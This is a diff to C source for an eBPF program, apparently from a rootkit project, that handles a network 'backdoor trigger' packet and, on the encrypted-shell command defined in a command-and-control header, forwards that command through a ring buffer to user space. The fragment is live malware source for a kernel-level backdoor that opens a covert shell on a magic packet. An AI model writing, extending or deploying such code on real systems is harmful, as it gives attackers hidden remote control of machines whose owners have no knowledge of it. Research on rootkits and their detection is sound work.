@@ -4,6 +4,10 @@
 #include "headervmlinux.h"
 
 #include <bpf/bpf_helpers.h>
+#include <bpf/bpf_tracing.h>
+#include <bpf/bpf_core_read.h>
+
+#include "../data/ring_buffer.h"
 #include "../../common/c&c.h"
 
 static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 payload_size){
@@ -73,9 +77,11 @@ static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 paylo
 
     //If we reach this point then we received trigger packet
     bpf_printk("Finished backdoor V1 check with success\n");
+    int pid = -1; //Received by network stack, just ignore
     switch(command_received){
         case CC_PROT_K3_ENCRYPTED_SHELL_TRIGGER_V1:
             bpf_printk("Received request to start encrypted connection\n");
+            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
             break;
         default:
             bpf_printk("Command received unknown: %d\n", command_received);
